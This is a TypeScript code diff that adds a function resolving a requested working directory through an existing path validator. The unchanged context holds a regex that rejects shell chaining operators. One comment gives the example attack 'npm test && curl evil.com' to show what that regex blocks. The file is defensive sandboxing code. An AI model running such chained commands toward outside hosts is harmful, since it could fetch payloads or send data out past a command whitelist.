@@ -78,6 +78,17 @@ export function validateFilePath(filePath: string, workingDirectory: string): st
   return resolved;
 }
 
+export function resolveWorkingDirectory(
+  requestedWorkingDirectory: string | undefined,
+  baseWorkingDirectory: string,
+): string {
+  const baseResolved = resolve(baseWorkingDirectory);
+  if (!requestedWorkingDirectory) {
+    return baseResolved;
+  }
+  return validateFilePath(requestedWorkingDirectory, baseResolved);
+}
+
 // Shell operators that allow command chaining — must be rejected
 // before whitelist check to prevent "npm test && curl evil.com"
 const SHELL_CHAIN_OPERATORS = /[;&|]|&&|\|\|/;
